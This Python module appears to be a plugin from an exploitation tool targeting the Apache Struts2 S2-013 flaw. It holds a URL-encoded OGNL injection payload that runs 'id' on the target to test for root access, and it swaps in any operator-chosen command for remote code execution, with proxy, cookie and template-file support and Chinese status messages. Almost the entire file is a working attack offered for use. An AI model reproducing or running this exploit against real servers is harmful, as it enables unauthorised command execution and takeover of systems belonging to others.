import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import hashlib
import urllib

cdd=''
http = ''
https = ''
cmd=''
dq1=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd,dq1
    global http, https,cmd
    try:
        proxies = {'http': http,
                   'https': https}
        if cmd!='':
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc1 = "%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('CMD').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"
            poc2=poc1.replace('CMD',cmd)
            data = dq1.format(exp=poc2)
            aa = requests.get(url1+data, headers=headers, proxies=proxies, verify=False, timeout=15,cookies=s_cookie)
            cdd = aa.text
            cmd=''
        else:
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc = "%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"
            data=dq1.format(exp=poc)
            aa = requests.post(url1+data, headers=headers, proxies=proxies, verify=False, timeout=15,cookies=s_cookie)
            if 'groups=0' in aa.text:
                cdd = '[+]漏洞存在\n执行命令：id\n匹配关键词：groups=0\n'+aa.text
            else:
                cdd = '[-]漏洞不存在\nPs：可更换 \POC\自定义.txt 中的4￥后的参数值再次尝试，格式禁止更改。'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-013 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1
def cmd12():
    global dq1
    import os
    cg=open(os.getcwd()+'\POC\自定义.txt','r',encoding='utf-8')
    while True:
        ca=cg.readline()
        if len(ca)==0:
            break
        elif '4￥' in ca:
            dq1=ca.replace('\n','').replace('4￥','')